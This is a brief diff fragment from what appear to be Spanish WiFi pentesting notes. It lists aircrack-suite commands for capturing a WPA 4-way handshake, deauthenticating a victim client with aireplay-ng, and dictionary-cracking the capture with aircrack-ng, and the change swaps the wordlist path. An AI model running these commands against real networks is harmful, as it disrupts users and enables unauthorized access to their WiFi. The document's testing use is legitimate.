@@ -153,7 +153,7 @@ airodump-ng -c [channel] --bssid MAC-AP -w NOMBRE-CAPTURA wlan0mon
 Capturamos el handshake =>
 aireplay-ng -0 1 -a MAC-AP -c MAC-VICTIM wlan0mon
 (El paquete 1 y el 3 del 4way handshake tienen que tener el mismo nonce (mirar en wireshark))
-aircrack-ng -0 -w DICC[/pentest/passwords/john/password.lst] NOMBRE-CAPTURA
+aircrack-ng -0 -w DICC[/root/psk-crack-dictionary] NOMBRE-CAPTURA
 
 #############
 ####EXTRA####
